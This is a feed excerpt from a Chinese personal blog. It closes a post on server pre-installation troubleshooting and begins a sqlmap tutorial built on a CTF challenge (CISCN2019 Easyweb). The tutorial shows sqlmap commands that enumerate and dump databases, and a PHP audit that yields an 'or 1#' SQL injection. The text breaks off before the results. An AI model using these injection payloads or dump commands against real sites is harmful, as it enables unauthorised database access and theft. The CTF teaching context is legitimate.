&lt;p&gt;当我直接从服务器对外管理界面复制mac的时候，邪恶的电脑会给我或前或后的加上空格符号，在前面的还可以看出来，删去了。在后面的看不出来，导致结果非常的哇塞。&lt;/p&gt;
&lt;h4 id=&#34;5重装种子机&#34;&gt;5.重装种子机
&lt;/h4&gt;&lt;p&gt;这个种子机手动重装居然耽误了我一天的时间。。。当时我可是信心满满，实际上坑不少。先从什么是NVME说起吧。&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://pic.imgdb.cn/item/6659b2f2d9c307b7e9cf4186.png&#34; &gt;
		&lt;img src=&#34;https://pic.imgdb.cn/item/6659b2f2d9c307b7e9cf4186.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;NVME是一种硬盘协议，专为SSD设计，利用高速接口进行CPU和SSD间的数据通信。除了快就是贵，用作加速盘，数据库服务器上都安排了两块。不巧的是，种子机选取的就是数据库的服务器，这个大伏笔。&lt;/p&gt;
&lt;p&gt;操作系统安好了之后，登不上去，一度让我怀疑是安装的时候连续两次输了相同的错误密码。最后发现一直登录的是原SIMS的系统，原来的硬盘没有格式化，而且放在了第一启动位置，出现了启动顺序冲突。这个问题之前遇到过了，所以很快就定位并修改了启动顺序。&lt;/p&gt;
&lt;p&gt;不同的服务器调整的方法不一样，之前浪潮的服务器只能支持所有硬盘作为一个整体来启动，我们只能提前规划好创建逻辑磁盘的顺序来达到目的，而这里中兴的R5300G4可以细分到哪个硬盘，我认为这个更加合理。&lt;/p&gt;
&lt;p&gt;然后就来了个大的。&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://pic.imgdb.cn/item/6659b3eed9c307b7e9d04963.jpg&#34; &gt;
		&lt;img src=&#34;https://pic.imgdb.cn/item/6659b3eed9c307b7e9d04963.jpg&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;调整了boot的硬盘启动顺序后，出现报错&lt;/p&gt;
&lt;p&gt;bash: cannot create temp file for here-document: Read-only file system&lt;/p&gt;
&lt;p&gt;还真没遇到过，排错吧~先使用mount命令查看结果，根目录显示ro（readonly），显然有问题。使用lsblk命令查看硬盘挂载情况，可以很明显的看到vg00大部分都没有挂载。&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://static.dingtalk.com/media/lALPD1W_9aDbhTPNAYDNAf8_511_384.png_810x10000.jpg&#34; &gt;
		&lt;img src=&#34;https://static.dingtalk.com/media/lALPD1W_9aDbhTPNAYDNAf8_511_384.png_810x10000.jpg&#34;
			
			
			
			loading=&#34;lazy&#34;
			alt=&#34;img&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;img&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;怀疑开机自动挂载没有打开，cat /etc/fstab查看情况，但是这里确实有记录自动挂载，那就是其他原因导致挂载不上去。&lt;/p&gt;
&lt;p&gt;然后看到nvme0n1里面还有SIMS部署用到的临时操作系统，使用如下命令删去并格式化。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#586e75;background-color:#eee8d5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;fdisk /dev/nvme0n1
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;d
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;mkfs.xfs /dev/nvme0n1
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;再次返回BMC页面，对系统RAID1进行快速格式化，重装系统，最后成功解决。接着就是yum源，配置，之前的那一套，拿下种子机的预装。&lt;/p&gt;
&lt;p&gt;原因有两点：第一，原SIMS的系统没有清除干净；第二，之前我对系统RAID1进行了慢速格式化，而当时我不知道这个格式化到底是什么速度，没等格式化完事等不及了安装系统。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;慢速初始化和快速初始化&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;快速格式化使系统认为磁盘上没有文件了。它并不真正格式化全部硬盘，而是快速地将文件系统标记为“无文件”状态。因此，快速格式化后，数据有可能通过特定的工具恢复。&lt;/p&gt;
&lt;p&gt;慢速格式化或完全格式化会扫描硬盘上的所有磁道，清除硬盘上的所有内容。这个过程还包括检查磁盘上的坏道，并对其进行标记。完全格式化后的数据无法恢复，因为它真正地擦除了磁盘上的所有数据。&lt;/p&gt;
&lt;p&gt;最最最后，利比里亚的服务器延迟一周发货，我们预先帮助之后的业务部门插下光纤。。。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;交换机与光纤安装&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;光模块（optical module）是现在通信中最重要的器件之一，实现光电转换，现在的光模块也集成了一些数字信号处理的功能。&lt;/p&gt;
&lt;p&gt;光纤有两个插孔，先接好一台机器，当要与另一台机器接的时候，查看此时光纤的两个插孔中哪一个一个冒光，你需要把光纤冒光的头插到机器不激光的口，把光纤不冒光的头插到机器冒光的口，完成上行和下行线路的建立。&lt;/p&gt;
&lt;h2 id=&#34;总结&#34;&gt;总结
&lt;/h2&gt;&lt;p&gt;关于预装，其实是分体力活和脑力活的。&lt;/p&gt;
&lt;p&gt;体力活包括但不限于：搬服务器，收集信息，插拔网线与光纤，服务器上电下电，甚至包括改BIOS。这部分涉及到反复操作，并且需要耐心（尤其是等服务器开机）。&lt;/p&gt;
&lt;p&gt;脑力活，可以是SIMS的调试，设备的调试，整体的预转的规划。尤其是在椅子上坐着看SIMS部署的时候，一片一片命令在日志翻过，可以明显感受到自动化脚本降维式的打击。&lt;/p&gt;
&lt;p&gt;多去干脑力活，对个人成长是有帮助的。每一次成长，都来源于直面和解决问题，而不是否定和逃避。半个月的时间，我从一个对物理服务器一无所知的小白，到最后自己可以独立安装操作系统和相关环境，成就感是有的。刚开始时，对物理服务器感到陌生和畏惧，但随着学习的深入和实践的积累，逐渐建立了信心。这是一个不断尝试和犯错的过程，不断从错误中吸取教训，慢慢经验就积累起来。&lt;/p&gt;
&lt;p&gt;顺带一提，一U是4.445cm。&lt;/p&gt;
&lt;p&gt;EOL&lt;/p&gt;
</description>
        </item>
        <item>
        <title>sqlmap使用实例</title>
        <link>https://proben1.github.io/2022/sqlmap%E4%BD%BF%E7%94%A8%E5%AE%9E%E4%BE%8B/</link>
        <pubDate>Tue, 03 May 2022 21:08:57 +0800</pubDate>
        
        <guid>https://proben1.github.io/2022/sqlmap%E4%BD%BF%E7%94%A8%E5%AE%9E%E4%BE%8B/</guid>
        <description>&lt;p&gt;学安全的时候第一件事就是在学长要求下安了sqlmap，可到现在还是只会这个：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#586e75;background-color:#eee8d5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sqlmap -u &amp;#34;url&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sqlmap -u &amp;#34;url&amp;#34; --dbs
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sqlmap -u &amp;#34;url&amp;#34; -D xx --tables 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sqlmap -u &amp;#34;url&amp;#34; -D xx -T xx --columns
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sqlmap -u &amp;#34;url&amp;#34; -D xx -T xx -C xx,xx --dump
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;或者一个post，把包抓下来，用：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#586e75;background-color:#eee8d5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sqlmap -r post.txt
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;今天就用一道题来演示一下，sqlmap的其他功能：&lt;/p&gt;
&lt;p&gt;题目是：[CISCN2019 总决赛 Day2 Web1]Easyweb&lt;/p&gt;
&lt;p&gt;源码：https://github.com/glzjin/CISCN_2019_Final_12_Day2_Web1&lt;/p&gt;
&lt;p&gt;或者直接buu搜……&lt;/p&gt;
&lt;p&gt;首先来审下题，robots.txt泄露出存在*.php.bak，再挨个php试一下，可以下载到image.php.bak，下面是审计部分，和sqlmap没关系，可以直接跳到结果部分&lt;/p&gt;
&lt;p&gt;源码如下：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#586e75;background-color:#eee8d5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;?&lt;span style=&#34;color:#268bd2&#34;&gt;php&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#859900&#34;&gt;include&lt;/span&gt; &lt;span style=&#34;color:#2aa198&#34;&gt;&amp;#34;config.php&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#268bd2&#34;&gt;$id&lt;/span&gt;=&lt;span style=&#34;color:#268bd2&#34;&gt;isset&lt;/span&gt;(&lt;span style=&#34;color:#268bd2&#34;&gt;$_GET&lt;/span&gt;[&lt;span style=&#34;color:#2aa198&#34;&gt;&amp;#34;id&amp;#34;&lt;/span&gt;])?&lt;span style=&#34;color:#268bd2&#34;&gt;$_GET&lt;/span&gt;[&lt;span style=&#34;color:#2aa198&#34;&gt;&amp;#34;id&amp;#34;&lt;/span&gt;]:&lt;span style=&#34;color:#2aa198&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#268bd2&#34;&gt;$path&lt;/span&gt;=&lt;span style=&#34;color:#268bd2&#34;&gt;isset&lt;/span&gt;(&lt;span style=&#34;color:#268bd2&#34;&gt;$_GET&lt;/span&gt;[&lt;span style=&#34;color:#2aa198&#34;&gt;&amp;#34;path&amp;#34;&lt;/span&gt;])?&lt;span style=&#34;color:#268bd2&#34;&gt;$_GET&lt;/span&gt;[&lt;span style=&#34;color:#2aa198&#34;&gt;&amp;#34;path&amp;#34;&lt;/span&gt;]:&lt;span style=&#34;color:#2aa198&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#268bd2&#34;&gt;$id&lt;/span&gt;=&lt;span style=&#34;color:#268bd2&#34;&gt;addslashes&lt;/span&gt;(&lt;span style=&#34;color:#268bd2&#34;&gt;$id&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#268bd2&#34;&gt;$path&lt;/span&gt;=&lt;span style=&#34;color:#268bd2&#34;&gt;addslashes&lt;/span&gt;(&lt;span style=&#34;color:#268bd2&#34;&gt;$path&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#268bd2&#34;&gt;$id&lt;/span&gt;=&lt;span style=&#34;color:#268bd2&#34;&gt;str_replace&lt;/span&gt;(&lt;span style=&#34;color:#859900&#34;&gt;array&lt;/span&gt;(&lt;span style=&#34;color:#2aa198&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#2aa198&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#2aa198&#34;&gt;0&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#2aa198&#34;&gt;&amp;#34;%00&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#2aa198&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#2aa198&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#2aa198&#34;&gt;&amp;#39;&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#2aa198&#34;&gt;&amp;#34;&amp;#39;&amp;#34;&lt;/span&gt;),&lt;span style=&#34;color:#2aa198&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#268bd2&#34;&gt;$id&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#268bd2&#34;&gt;$path&lt;/span&gt;=&lt;span style=&#34;color:#268bd2&#34;&gt;str_replace&lt;/span&gt;(&lt;span style=&#34;color:#859900&#34;&gt;array&lt;/span&gt;(&lt;span style=&#34;color:#2aa198&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#2aa198&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#2aa198&#34;&gt;0&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#2aa198&#34;&gt;&amp;#34;%00&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#2aa198&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#2aa198&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#2aa198&#34;&gt;&amp;#39;&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#2aa198&#34;&gt;&amp;#34;&amp;#39;&amp;#34;&lt;/span&gt;),&lt;span style=&#34;color:#2aa198&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#268bd2&#34;&gt;$path&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#268bd2&#34;&gt;$result&lt;/span&gt;=&lt;span style=&#34;color:#268bd2&#34;&gt;mysqli_query&lt;/span&gt;(&lt;span style=&#34;color:#268bd2&#34;&gt;$con&lt;/span&gt;,&lt;span style=&#34;color:#2aa198&#34;&gt;&amp;#34;select * from images where id=&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#2aa198&#34;&gt;{&lt;/span&gt;&lt;span style=&#34;color:#268bd2&#34;&gt;$id&lt;/span&gt;&lt;span style=&#34;color:#2aa198&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#2aa198&#34;&gt;&amp;#39; or path=&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#2aa198&#34;&gt;{&lt;/span&gt;&lt;span style=&#34;color:#268bd2&#34;&gt;$path&lt;/span&gt;&lt;span style=&#34;color:#2aa198&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#2aa198&#34;&gt;&amp;#39;&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#268bd2&#34;&gt;$row&lt;/span&gt;=&lt;span style=&#34;color:#268bd2&#34;&gt;mysqli_fetch_array&lt;/span&gt;(&lt;span style=&#34;color:#268bd2&#34;&gt;$result&lt;/span&gt;,&lt;span style=&#34;color:#268bd2&#34;&gt;MYSQLI_ASSOC&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#268bd2&#34;&gt;$path&lt;/span&gt;=&lt;span style=&#34;color:#2aa198&#34;&gt;&amp;#34;./&amp;#34;&lt;/span&gt; . &lt;span style=&#34;color:#268bd2&#34;&gt;$row&lt;/span&gt;[&lt;span style=&#34;color:#2aa198&#34;&gt;&amp;#34;path&amp;#34;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#268bd2&#34;&gt;header&lt;/span&gt;(&lt;span style=&#34;color:#2aa198&#34;&gt;&amp;#34;Content-Type: image/jpeg&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#268bd2&#34;&gt;readfile&lt;/span&gt;(&lt;span style=&#34;color:#268bd2&#34;&gt;$path&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;我们发现addslashes()和str_replace()一起使用引起了安全隐患，当我们id输入为\0时，测试如下：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#586e75;background-color:#eee8d5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;?&lt;span style=&#34;color:#268bd2&#34;&gt;php&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#268bd2&#34;&gt;$id&lt;/span&gt;=&lt;span style=&#34;color:#268bd2&#34;&gt;isset&lt;/span&gt;(&lt;span style=&#34;color:#268bd2&#34;&gt;$_GET&lt;/span&gt;[&lt;span style=&#34;color:#2aa198&#34;&gt;&amp;#34;id&amp;#34;&lt;/span&gt;])?&lt;span style=&#34;color:#268bd2&#34;&gt;$_GET&lt;/span&gt;[&lt;span style=&#34;color:#2aa198&#34;&gt;&amp;#34;id&amp;#34;&lt;/span&gt;]:&lt;span style=&#34;color:#2aa198&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#268bd2&#34;&gt;$path&lt;/span&gt;=&lt;span style=&#34;color:#268bd2&#34;&gt;isset&lt;/span&gt;(&lt;span style=&#34;color:#268bd2&#34;&gt;$_GET&lt;/span&gt;[&lt;span style=&#34;color:#2aa198&#34;&gt;&amp;#34;path&amp;#34;&lt;/span&gt;])?&lt;span style=&#34;color:#268bd2&#34;&gt;$_GET&lt;/span&gt;[&lt;span style=&#34;color:#2aa198&#34;&gt;&amp;#34;path&amp;#34;&lt;/span&gt;]:&lt;span style=&#34;color:#2aa198&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#268bd2&#34;&gt;输入：id&lt;/span&gt;=&lt;span style=&#34;color:#268bd2&#34;&gt;\0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#268bd2&#34;&gt;$id&lt;/span&gt;=&lt;span style=&#34;color:#268bd2&#34;&gt;addslashes&lt;/span&gt;(&lt;span style=&#34;color:#268bd2&#34;&gt;$id&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#268bd2&#34;&gt;$path&lt;/span&gt;=&lt;span style=&#34;color:#268bd2&#34;&gt;addslashes&lt;/span&gt;(&lt;span style=&#34;color:#268bd2&#34;&gt;$path&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#859900&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#268bd2&#34;&gt;$id&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#859900&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#2aa198&#34;&gt;&amp;#34;&amp;lt;br&amp;gt;&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#268bd2&#34;&gt;输出：\\0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#268bd2&#34;&gt;$id&lt;/span&gt;=&lt;span style=&#34;color:#268bd2&#34;&gt;str_replace&lt;/span&gt;(&lt;span style=&#34;color:#859900&#34;&gt;array&lt;/span&gt;(&lt;span style=&#34;color:#2aa198&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#2aa198&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#2aa198&#34;&gt;0&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#2aa198&#34;&gt;&amp;#34;%00&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#2aa198&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#2aa198&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#2aa198&#34;&gt;&amp;#39;&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#2aa198&#34;&gt;&amp;#34;&amp;#39;&amp;#34;&lt;/span&gt;),&lt;span style=&#34;color:#2aa198&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#268bd2&#34;&gt;$id&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#268bd2&#34;&gt;$path&lt;/span&gt;=&lt;span style=&#34;color:#268bd2&#34;&gt;str_replace&lt;/span&gt;(&lt;span style=&#34;color:#859900&#34;&gt;array&lt;/span&gt;(&lt;span style=&#34;color:#2aa198&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#2aa198&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#2aa198&#34;&gt;0&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#2aa198&#34;&gt;&amp;#34;%00&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#2aa198&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#2aa198&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#2aa198&#34;&gt;&amp;#39;&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#2aa198&#34;&gt;&amp;#34;&amp;#39;&amp;#34;&lt;/span&gt;),&lt;span style=&#34;color:#2aa198&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#268bd2&#34;&gt;$path&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#859900&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#268bd2&#34;&gt;$id&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#859900&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#2aa198&#34;&gt;&amp;#34;&amp;lt;br&amp;gt;&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#268bd2&#34;&gt;输出：\&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#268bd2&#34;&gt;$result&lt;/span&gt;=&lt;span style=&#34;color:#2aa198&#34;&gt;&amp;#34;select * from images where id=&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#2aa198&#34;&gt;{&lt;/span&gt;&lt;span style=&#34;color:#268bd2&#34;&gt;$id&lt;/span&gt;&lt;span style=&#34;color:#2aa198&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#2aa198&#34;&gt;&amp;#39; or path=&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#2aa198&#34;&gt;{&lt;/span&gt;&lt;span style=&#34;color:#268bd2&#34;&gt;$path&lt;/span&gt;&lt;span style=&#34;color:#2aa198&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#2aa198&#34;&gt;&amp;#39;&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#268bd2&#34;&gt;$path&lt;/span&gt;=&lt;span style=&#34;color:#2aa198&#34;&gt;&amp;#34;./&amp;#34;&lt;/span&gt; . &lt;span style=&#34;color:#268bd2&#34;&gt;$row&lt;/span&gt;[&lt;span style=&#34;color:#2aa198&#34;&gt;&amp;#34;path&amp;#34;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#859900&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#268bd2&#34;&gt;$result&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#268bd2&#34;&gt;输出：select&lt;/span&gt; * &lt;span style=&#34;color:#268bd2&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color:#268bd2&#34;&gt;images&lt;/span&gt; &lt;span style=&#34;color:#268bd2&#34;&gt;where&lt;/span&gt; &lt;span style=&#34;color:#268bd2&#34;&gt;id&lt;/span&gt;=&lt;span style=&#34;color:#2aa198&#34;&gt;&amp;#39;\&amp;#39; or path=&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#859900&#34;&gt;or&lt;/span&gt; &lt;span style=&#34;color:#2aa198;font-weight:bold&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#93a1a1;font-style:italic&#34;&gt;#&amp;#39;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;可以发现最终的形式是这样的：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#586e75;background-color:#eee8d5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;select * from images where id=&amp;#39;xxx&amp;#39; or 1#&amp;#39;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;得出结果：&lt;/p&gt;
